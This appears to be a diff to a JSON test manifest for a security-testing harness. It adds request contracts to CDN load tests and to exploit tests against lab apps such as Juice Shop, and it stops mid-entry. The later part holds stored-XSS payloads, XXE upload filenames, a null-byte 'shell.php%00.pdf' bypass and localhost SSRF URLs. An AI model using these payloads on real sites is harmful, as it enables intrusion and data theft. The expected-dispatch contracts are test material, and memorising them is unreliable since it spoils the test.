@@ -2263,7 +2263,60 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": true,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "baseline-0",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "baseline-1",
+            "method": "GET",
+            "path": "/whoami/",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "baseline-2",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "baseline-3",
+            "method": "GET",
+            "path": "/dvwa/login.php",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "baseline-4",
+            "method": "GET",
+            "path": "/vampi/users/v1",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "baseline-5",
+            "method": "GET",
+            "path": "/csd-demo/health",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "baseline-6",
+            "method": "GET",
+            "path": "/health",
+            "payload_class": "per-endpoint-throughput",
+            "minimum_dispatches": 20
+          }
+        ]
+      }
     },
     {
       "id": "cdn-load-testing/02-query-string-isolation",
@@ -2276,7 +2329,185 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": true,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "user-alice",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "query-isolation",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "user": "alice"
+            }
+          },
+          {
+            "id": "user-bob",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "query-isolation",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "user": "bob"
+            }
+          },
+          {
+            "id": "user-charlie",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "query-isolation",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "user": "charlie"
+            }
+          },
+          {
+            "id": "user-dave",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "query-isolation",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "user": "dave"
+            }
+          },
+          {
+            "id": "user-eve",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "query-isolation",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "user": "eve"
+            }
+          },
+          {
+            "id": "q-apple",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "query-isolation",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "q": "apple"
+            }
+          },
+          {
+            "id": "q-banana",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "query-isolation",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "q": "banana"
+            }
+          },
+          {
+            "id": "q-cherry",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "query-isolation",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "q": "cherry"
+            }
+          },
+          {
+            "id": "q-orange",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "query-isolation",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "q": "orange"
+            }
+          },
+          {
+            "id": "q-lemon",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "query-isolation",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "q": "lemon"
+            }
+          },
+          {
+            "id": "v-1",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "query-isolation",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "v": "1"
+            }
+          },
+          {
+            "id": "v-2",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "query-isolation",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "v": "2"
+            }
+          },
+          {
+            "id": "v-3",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "query-isolation",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "v": "3"
+            }
+          },
+          {
+            "id": "v-4",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "query-isolation",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "v": "4"
+            }
+          },
+          {
+            "id": "v-5",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "query-isolation",
+            "minimum_dispatches": 2,
+            "query_values": {
+              "v": "5"
+            }
+          },
+          {
+            "id": "cold-random",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "random-query-isolation",
+            "minimum_dispatches": 40,
+            "query_regex": "r=[a-f0-9-]{36}"
+          },
+          {
+            "id": "alpha",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "cross-contamination-control",
+            "minimum_dispatches": 1,
+            "query_regex": "iso=alpha-[0-9]+"
+          },
+          {
+            "id": "bravo",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "cross-contamination-control",
+            "minimum_dispatches": 1,
+            "query_regex": "iso=bravo-[0-9]+"
+          }
+        ]
+      }
     },
     {
       "id": "cdn-load-testing/03-accept-encoding-variation",
@@ -2289,7 +2520,243 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": true,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "encoding-0-0",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "accept-encoding-variation",
+            "minimum_dispatches": 1,
+            "headers": {
+              "accept-encoding": "gzip"
+            }
+          },
+          {
+            "id": "encoding-0-1",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "accept-encoding-variation",
+            "minimum_dispatches": 1,
+            "headers": {
+              "accept-encoding": "br"
+            }
+          },
+          {
+            "id": "encoding-0-2",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "accept-encoding-variation",
+            "minimum_dispatches": 1,
+            "headers": {
+              "accept-encoding": "gzip, deflate"
+            }
+          },
+          {
+            "id": "encoding-0-3",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "accept-encoding-variation",
+            "minimum_dispatches": 1,
+            "headers": {
+              "accept-encoding": "gzip, deflate, br"
+            }
+          },
+          {
+            "id": "encoding-0-4",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "accept-encoding-variation",
+            "minimum_dispatches": 1,
+            "headers": {
+              "accept-encoding": "identity"
+            }
+          },
+          {
+            "id": "absent-0",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "no-accept-encoding",
+            "minimum_dispatches": 1,
+            "absent_headers": ["accept-encoding"]
+          },
+          {
+            "id": "encoding-1-0",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "accept-encoding-variation",
+            "minimum_dispatches": 1,
+            "headers": {
+              "accept-encoding": "gzip"
+            }
+          },
+          {
+            "id": "encoding-1-1",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "accept-encoding-variation",
+            "minimum_dispatches": 1,
+            "headers": {
+              "accept-encoding": "br"
+            }
+          },
+          {
+            "id": "encoding-1-2",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "accept-encoding-variation",
+            "minimum_dispatches": 1,
+            "headers": {
+              "accept-encoding": "gzip, deflate"
+            }
+          },
+          {
+            "id": "encoding-1-3",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "accept-encoding-variation",
+            "minimum_dispatches": 1,
+            "headers": {
+              "accept-encoding": "gzip, deflate, br"
+            }
+          },
+          {
+            "id": "encoding-1-4",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "accept-encoding-variation",
+            "minimum_dispatches": 1,
+            "headers": {
+              "accept-encoding": "identity"
+            }
+          },
+          {
+            "id": "absent-1",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "no-accept-encoding",
+            "minimum_dispatches": 1,
+            "absent_headers": ["accept-encoding"]
+          },
+          {
+            "id": "encoding-2-0",
+            "method": "GET",
+            "path": "/whoami/",
+            "payload_class": "accept-encoding-variation",
+            "minimum_dispatches": 1,
+            "headers": {
+              "accept-encoding": "gzip"
+            }
+          },
+          {
+            "id": "encoding-2-1",
+            "method": "GET",
+            "path": "/whoami/",
+            "payload_class": "accept-encoding-variation",
+            "minimum_dispatches": 1,
+            "headers": {
+              "accept-encoding": "br"
+            }
+          },
+          {
+            "id": "encoding-2-2",
+            "method": "GET",
+            "path": "/whoami/",
+            "payload_class": "accept-encoding-variation",
+            "minimum_dispatches": 1,
+            "headers": {
+              "accept-encoding": "gzip, deflate"
+            }
+          },
+          {
+            "id": "encoding-2-3",
+            "method": "GET",
+            "path": "/whoami/",
+            "payload_class": "accept-encoding-variation",
+            "minimum_dispatches": 1,
+            "headers": {
+              "accept-encoding": "gzip, deflate, br"
+            }
+          },
+          {
+            "id": "encoding-2-4",
+            "method": "GET",
+            "path": "/whoami/",
+            "payload_class": "accept-encoding-variation",
+            "minimum_dispatches": 1,
+            "headers": {
+              "accept-encoding": "identity"
+            }
+          },
+          {
+            "id": "absent-2",
+            "method": "GET",
+            "path": "/whoami/",
+            "payload_class": "no-accept-encoding",
+            "minimum_dispatches": 1,
+            "absent_headers": ["accept-encoding"]
+          },
+          {
+            "id": "encoding-3-0",
+            "method": "GET",
+            "path": "/health",
+            "payload_class": "accept-encoding-variation",
+            "minimum_dispatches": 1,
+            "headers": {
+              "accept-encoding": "gzip"
+            }
+          },
+          {
+            "id": "encoding-3-1",
+            "method": "GET",
+            "path": "/health",
+            "payload_class": "accept-encoding-variation",
+            "minimum_dispatches": 1,
+            "headers": {
+              "accept-encoding": "br"
+            }
+          },
+          {
+            "id": "encoding-3-2",
+            "method": "GET",
+            "path": "/health",
+            "payload_class": "accept-encoding-variation",
+            "minimum_dispatches": 1,
+            "headers": {
+              "accept-encoding": "gzip, deflate"
+            }
+          },
+          {
+            "id": "encoding-3-3",
+            "method": "GET",
+            "path": "/health",
+            "payload_class": "accept-encoding-variation",
+            "minimum_dispatches": 1,
+            "headers": {
+              "accept-encoding": "gzip, deflate, br"
+            }
+          },
+          {
+            "id": "encoding-3-4",
+            "method": "GET",
+            "path": "/health",
+            "payload_class": "accept-encoding-variation",
+            "minimum_dispatches": 1,
+            "headers": {
+              "accept-encoding": "identity"
+            }
+          },
+          {
+            "id": "absent-3",
+            "method": "GET",
+            "path": "/health",
+            "payload_class": "no-accept-encoding",
+            "minimum_dispatches": 1,
+            "absent_headers": ["accept-encoding"]
+          }
+        ]
+      }
     },
     {
       "id": "cdn-load-testing/04-thundering-herd",
@@ -2302,7 +2769,35 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": true,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "stampede-0",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "same-query-concurrent-burst",
+            "minimum_dispatches": 100,
+            "query_regex": "^stampede-[0-9]+-[0-9]+$"
+          },
+          {
+            "id": "stampede-1",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "same-query-concurrent-burst",
+            "minimum_dispatches": 100,
+            "query_regex": "^stampede-[0-9]+-[0-9]+$"
+          },
+          {
+            "id": "stampede-2",
+            "method": "GET",
+            "path": "/whoami/",
+            "payload_class": "same-query-concurrent-burst",
+            "minimum_dispatches": 100,
+            "query_regex": "^stampede-[0-9]+-[0-9]+$"
+          }
+        ]
+      }
     },
     {
       "id": "cdn-load-testing/05-post-put-bypass",
@@ -2315,7 +2810,106 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": true,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "method-47",
+            "method": "POST",
+            "path": "/httpbin/post",
+            "payload_class": "non-get-cache-bypass",
+            "minimum_dispatches": 1,
+            "body_regex": "\"(test|username|email|comment)\"",
+            "headers": {
+              "content-type": "application/json"
+            }
+          },
+          {
+            "id": "method-48",
+            "method": "PUT",
+            "path": "/httpbin/put",
+            "payload_class": "non-get-cache-bypass",
+            "minimum_dispatches": 1,
+            "body_regex": "\"(test|username|email|comment)\"",
+            "headers": {
+              "content-type": "application/json"
+            }
+          },
+          {
+            "id": "method-49",
+            "method": "DELETE",
+            "path": "/httpbin/delete",
+            "payload_class": "non-get-cache-bypass",
+            "minimum_dispatches": 1,
+            "body_regex": "\"(test|username|email|comment)\"",
+            "headers": {
+              "content-type": "application/json"
+            }
+          },
+          {
+            "id": "method-50",
+            "method": "PATCH",
+            "path": "/httpbin/patch",
+            "payload_class": "non-get-cache-bypass",
+            "minimum_dispatches": 1,
+            "body_regex": "\"(test|username|email|comment)\"",
+            "headers": {
+              "content-type": "application/json"
+            }
+          },
+          {
+            "id": "method-55",
+            "method": "POST",
+            "path": "/vampi/users/v1/register",
+            "payload_class": "non-get-cache-bypass",
+            "minimum_dispatches": 1,
+            "body_regex": "\"(test|username|email|comment)\"",
+            "headers": {
+              "content-type": "application/json"
+            }
+          },
+          {
+            "id": "method-56",
+            "method": "POST",
+            "path": "/vampi/users/v1/login",
+            "payload_class": "non-get-cache-bypass",
+            "minimum_dispatches": 1,
+            "body_regex": "\"(test|username|email|comment)\"",
+            "headers": {
+              "content-type": "application/json"
+            }
+          },
+          {
+            "id": "method-61",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "non-get-cache-bypass",
+            "minimum_dispatches": 1,
+            "body_regex": "\"(test|username|email|comment)\"",
+            "headers": {
+              "content-type": "application/json"
+            }
+          },
+          {
+            "id": "method-62",
+            "method": "POST",
+            "path": "/juice-shop/api/Feedbacks/",
+            "payload_class": "non-get-cache-bypass",
+            "minimum_dispatches": 1,
+            "body_regex": "\"(test|username|email|comment)\"",
+            "headers": {
+              "content-type": "application/json"
+            }
+          },
+          {
+            "id": "get-control",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "post-bypass-read-control",
+            "minimum_dispatches": 2
+          }
+        ]
+      }
     },
     {
       "id": "cdn-load-testing/06-multi-client-simulation",
@@ -2328,7 +2922,24 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": true,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "header-echo",
+            "method": "GET",
+            "path": "/httpbin/headers",
+            "payload_class": "correlated-client-ip-headers",
+            "minimum_dispatches": 5,
+            "header_regex": {
+              "x-forwarded-for": "(192\\.0\\.2|198\\.51\\.100|203\\.0\\.113)\\.[0-9]+",
+              "true-client-ip": "(192\\.0\\.2|198\\.51\\.100|203\\.0\\.113)\\.[0-9]+",
+              "cf-connecting-ip": "(192\\.0\\.2|198\\.51\\.100|203\\.0\\.113)\\.[0-9]+",
+              "fastly-client-ip": "(192\\.0\\.2|198\\.51\\.100|203\\.0\\.113)\\.[0-9]+"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "cdn-load-testing/07-sustained-cache-expiry",
@@ -2341,7 +2952,60 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": true,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "sample-0",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "cache-expiry-sampling",
+            "minimum_dispatches": 10
+          },
+          {
+            "id": "sample-1",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "cache-expiry-sampling",
+            "minimum_dispatches": 10
+          },
+          {
+            "id": "sample-2",
+            "method": "GET",
+            "path": "/whoami/",
+            "payload_class": "cache-expiry-sampling",
+            "minimum_dispatches": 10
+          },
+          {
+            "id": "sample-3",
+            "method": "GET",
+            "path": "/health",
+            "payload_class": "cache-expiry-sampling",
+            "minimum_dispatches": 10
+          },
+          {
+            "id": "sample-4",
+            "method": "GET",
+            "path": "/dvwa/login.php",
+            "payload_class": "cache-expiry-sampling",
+            "minimum_dispatches": 10
+          },
+          {
+            "id": "sample-5",
+            "method": "GET",
+            "path": "/vampi/users/v1",
+            "payload_class": "cache-expiry-sampling",
+            "minimum_dispatches": 10
+          },
+          {
+            "id": "sample-6",
+            "method": "GET",
+            "path": "/csd-demo/health",
+            "payload_class": "cache-expiry-sampling",
+            "minimum_dispatches": 10
+          }
+        ]
+      }
     },
     {
       "id": "cdn-load-testing/08-kraken-cdn-max",
@@ -2354,7 +3018,60 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": true,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "load-0",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "parallel-load-engine",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "load-1",
+            "method": "GET",
+            "path": "/dvwa/login.php",
+            "payload_class": "parallel-load-engine",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "load-2",
+            "method": "GET",
+            "path": "/vampi/users/v1",
+            "payload_class": "parallel-load-engine",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "load-3",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "parallel-load-engine",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "load-4",
+            "method": "GET",
+            "path": "/csd-demo/health",
+            "payload_class": "parallel-load-engine",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "load-5",
+            "method": "GET",
+            "path": "/whoami/",
+            "payload_class": "parallel-load-engine",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "load-6",
+            "method": "GET",
+            "path": "/health",
+            "payload_class": "parallel-load-engine",
+            "minimum_dispatches": 20
+          }
+        ]
+      }
     },
     {
       "id": "cdn-load-testing/09-origin-torture",
@@ -2367,7 +3084,123 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": true,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "load-0",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "all-application-parallel-load",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "load-1",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "all-application-parallel-load",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "load-2",
+            "method": "GET",
+            "path": "/dvwa/login.php",
+            "payload_class": "all-application-parallel-load",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "load-3",
+            "method": "GET",
+            "path": "/vampi/users/v1",
+            "payload_class": "all-application-parallel-load",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "load-4",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "all-application-parallel-load",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "load-5",
+            "method": "GET",
+            "path": "/httpbin/headers",
+            "payload_class": "all-application-parallel-load",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "load-6",
+            "method": "GET",
+            "path": "/csd-demo/health",
+            "payload_class": "all-application-parallel-load",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "load-7",
+            "method": "GET",
+            "path": "/whoami/",
+            "payload_class": "all-application-parallel-load",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "load-8",
+            "method": "GET",
+            "path": "/health",
+            "payload_class": "all-application-parallel-load",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "load-9",
+            "method": "GET",
+            "path": "/dvga/",
+            "payload_class": "all-application-parallel-load",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "load-10",
+            "method": "GET",
+            "path": "/restaurant/docs",
+            "payload_class": "all-application-parallel-load",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "load-11",
+            "method": "GET",
+            "path": "/restaurant/menu",
+            "payload_class": "all-application-parallel-load",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "crapi-0",
+            "method": "GET",
+            "path": "/crapi/",
+            "payload_class": "crapi-parallel-load",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "crapi-1",
+            "method": "GET",
+            "path": "/crapi/identity/api/v2/user/dashboard",
+            "payload_class": "crapi-parallel-load",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "crapi-2",
+            "method": "GET",
+            "path": "/crapi/workshop/api/shop/products",
+            "payload_class": "crapi-parallel-load",
+            "minimum_dispatches": 20
+          },
+          {
+            "id": "crapi-3",
+            "method": "GET",
+            "path": "/crapi/community/api/v2/community/posts",
+            "payload_class": "crapi-parallel-load",
+            "minimum_dispatches": 20
+          }
+        ]
+      }
     },
     {
       "id": "cdn-load-testing/bench-keepalive",
@@ -5185,7 +6018,146 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "feedback-0",
+            "method": "POST",
+            "path": "/juice-shop/api/Feedbacks/",
+            "payload_class": "stored-xss-feedback",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"comment\":\"<script>alert(\\\"stored-xss\\\")</script>\",\"rating\":3}"
+          },
+          {
+            "id": "review-0",
+            "method": "PUT",
+            "path": "/juice-shop/rest/products/1/reviews",
+            "payload_class": "stored-xss-review",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"message\":\"<script>alert(\\\"stored-xss\\\")</script>\",\"author\":\"test@test.com\"}"
+          },
+          {
+            "id": "feedback-1",
+            "method": "POST",
+            "path": "/juice-shop/api/Feedbacks/",
+            "payload_class": "stored-xss-feedback",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"comment\":\"<img src=x onerror=alert(\\\"stored\\\")>\",\"rating\":3}"
+          },
+          {
+            "id": "review-1",
+            "method": "PUT",
+            "path": "/juice-shop/rest/products/1/reviews",
+            "payload_class": "stored-xss-review",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"message\":\"<img src=x onerror=alert(\\\"stored\\\")>\",\"author\":\"test@test.com\"}"
+          },
+          {
+            "id": "feedback-2",
+            "method": "POST",
+            "path": "/juice-shop/api/Feedbacks/",
+            "payload_class": "stored-xss-feedback",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"comment\":\"<svg onload=alert(\\\"stored\\\")>\",\"rating\":3}"
+          },
+          {
+            "id": "review-2",
+            "method": "PUT",
+            "path": "/juice-shop/rest/products/1/reviews",
+            "payload_class": "stored-xss-review",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"message\":\"<svg onload=alert(\\\"stored\\\")>\",\"author\":\"test@test.com\"}"
+          },
+          {
+            "id": "feedback-3",
+            "method": "POST",
+            "path": "/juice-shop/api/Feedbacks/",
+            "payload_class": "stored-xss-feedback",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"comment\":\"<iframe src=\\\"javascript:alert(1)\\\">\",\"rating\":3}"
+          },
+          {
+            "id": "review-3",
+            "method": "PUT",
+            "path": "/juice-shop/rest/products/1/reviews",
+            "payload_class": "stored-xss-review",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"message\":\"<iframe src=\\\"javascript:alert(1)\\\">\",\"author\":\"test@test.com\"}"
+          },
+          {
+            "id": "feedback-4",
+            "method": "POST",
+            "path": "/juice-shop/api/Feedbacks/",
+            "payload_class": "stored-xss-feedback",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"comment\":\"<b onmouseover=alert(1)>hover me</b>\",\"rating\":3}"
+          },
+          {
+            "id": "review-4",
+            "method": "PUT",
+            "path": "/juice-shop/rest/products/1/reviews",
+            "payload_class": "stored-xss-review",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"message\":\"<b onmouseover=alert(1)>hover me</b>\",\"author\":\"test@test.com\"}"
+          },
+          {
+            "id": "feedback-5",
+            "method": "POST",
+            "path": "/juice-shop/api/Feedbacks/",
+            "payload_class": "stored-xss-feedback",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"comment\":\"<<SCRIPT>alert(\\\"XSS\\\");//<</SCRIPT>\",\"rating\":3}"
+          },
+          {
+            "id": "review-5",
+            "method": "PUT",
+            "path": "/juice-shop/rest/products/1/reviews",
+            "payload_class": "stored-xss-review",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"message\":\"<<SCRIPT>alert(\\\"XSS\\\");//<</SCRIPT>\",\"author\":\"test@test.com\"}"
+          },
+          {
+            "id": "rating-0",
+            "method": "POST",
+            "path": "/juice-shop/api/Feedbacks/",
+            "payload_class": "invalid-rating",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"comment\":\"rating test\",\"rating\":0}"
+          },
+          {
+            "id": "rating--1",
+            "method": "POST",
+            "path": "/juice-shop/api/Feedbacks/",
+            "payload_class": "invalid-rating",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"comment\":\"rating test\",\"rating\":-1}"
+          },
+          {
+            "id": "rating-6",
+            "method": "POST",
+            "path": "/juice-shop/api/Feedbacks/",
+            "payload_class": "invalid-rating",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"comment\":\"rating test\",\"rating\":6}"
+          },
+          {
+            "id": "rating-999",
+            "method": "POST",
+            "path": "/juice-shop/api/Feedbacks/",
+            "payload_class": "invalid-rating",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"comment\":\"rating test\",\"rating\":999}"
+          },
+          {
+            "id": "readback",
+            "method": "GET",
+            "path": "/juice-shop/api/Feedbacks/",
+            "payload_class": "stored-feedback-readback",
+            "minimum_dispatches": 1
+          }
+        ]
+      }
     },
     {
       "id": "juice-shop-exploits/05-idor-basket-access",
@@ -5900,7 +6872,173 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "upload-0",
+            "method": "POST",
+            "path": "/juice-shop/file-upload",
+            "payload_class": "multipart-xml-or-polyglot",
+            "minimum_dispatches": 1,
+            "body_regex": "filename=\"xxe\\-passwd\\.xml\""
+          },
+          {
+            "id": "upload-1",
+            "method": "POST",
+            "path": "/juice-shop/file-upload",
+            "payload_class": "multipart-xml-or-polyglot",
+            "minimum_dispatches": 1,
+            "body_regex": "filename=\"xxe\\-hosts\\.xml\""
+          },
+          {
+            "id": "upload-2",
+            "method": "POST",
+            "path": "/juice-shop/file-upload",
+            "payload_class": "multipart-xml-or-polyglot",
+            "minimum_dispatches": 1,
+            "body_regex": "filename=\"xxe\\-ssrf\\.xml\""
+          },
+          {
+            "id": "upload-3",
+            "method": "POST",
+            "path": "/juice-shop/file-upload",
+            "payload_class": "multipart-xml-or-polyglot",
+            "minimum_dispatches": 1,
+            "body_regex": "filename=\"xxe\\-parameterEntity\\.xml\""
+          },
+          {
+            "id": "upload-4",
+            "method": "POST",
+            "path": "/juice-shop/file-upload",
+            "payload_class": "multipart-xml-or-polyglot",
+            "minimum_dispatches": 1,
+            "body_regex": "filename=\"shell\\.pdf\""
+          },
+          {
+            "id": "upload-5",
+            "method": "POST",
+            "path": "/juice-shop/file-upload",
+            "payload_class": "multipart-xml-or-polyglot",
+            "minimum_dispatches": 1,
+            "body_regex": "filename=\"shell\\.php%00\\.pdf\""
+          },
+          {
+            "id": "upload-6",
+            "method": "POST",
+            "path": "/juice-shop/file-upload",
+            "payload_class": "multipart-xml-or-polyglot",
+            "minimum_dispatches": 1,
+            "body_regex": "filename=\"polyglot\\.pdf\""
+          },
+          {
+            "id": "upload-7",
+            "method": "POST",
+            "path": "/juice-shop/file-upload",
+            "payload_class": "multipart-xml-or-polyglot",
+            "minimum_dispatches": 1,
+            "body_regex": "filename=\"oversized_final\\.pdf\""
+          },
+          {
+            "id": "ssrf-0",
+            "method": "POST",
+            "path": "/juice-shop/profile/image/url",
+            "payload_class": "profile-image-ssrf",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"imageUrl\":\"http://localhost:3000/api/Users\"}"
+          },
+          {
+            "id": "ssrf-1",
+            "method": "POST",
+            "path": "/juice-shop/profile/image/url",
+            "payload_class": "profile-image-ssrf",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"imageUrl\":\"http://127.0.0.1:3000/api/Users\"}"
+          },
+          {
+            "id": "ssrf-2",
+            "method": "POST",
+            "path": "/juice-shop/profile/image/url",
+            "payload_class": "profile-image-ssrf",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"imageUrl\":\"http://0:3000/api/Users\"}"
+          },
+          {
+            "id": "ssrf-3",
+            "method": "POST",
+            "path": "/juice-shop/profile/image/url",
+            "payload_class": "profile-image-ssrf",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"imageUrl\":\"http://[::1]:3000/api/Users\"}"
+          },
+          {
+            "id": "ssrf-4",
+            "method": "POST",
+            "path": "/juice-shop/profile/image/url",
+            "payload_class": "profile-image-ssrf",
+            "minimum_dispatches": 1,
